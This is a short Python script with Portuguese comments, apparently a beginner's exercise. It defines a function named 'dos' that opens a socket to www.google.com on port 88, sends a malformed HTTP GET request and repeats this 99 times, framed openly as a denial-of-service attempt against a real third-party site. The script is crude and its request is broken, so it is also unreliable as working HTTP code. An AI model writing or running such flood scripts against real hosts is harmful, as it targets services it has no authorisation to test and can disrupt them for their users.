import socket
import sys
import os

def dos():
    #host = sys.arg[1]
    host = "www.google.com"
    porta = 88
    # cria um objeto socket
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    # faz o cliente se conectar
    client.connect((host,porta))

    display_msg = 'Criando pacote: GET/ HTTP/1.1'
    print(display_msg.encode())
    # envia alguns dados
    get_http = 'Get/ HTTP/1.1\r\n Host :' +host+ '\r\n\r\n'
    client.send(get_http.encode())
    # recebe alguns dados
    response = client.recv(4096)
    print(response)
    client.close()
for i in range(1,100):
    dos()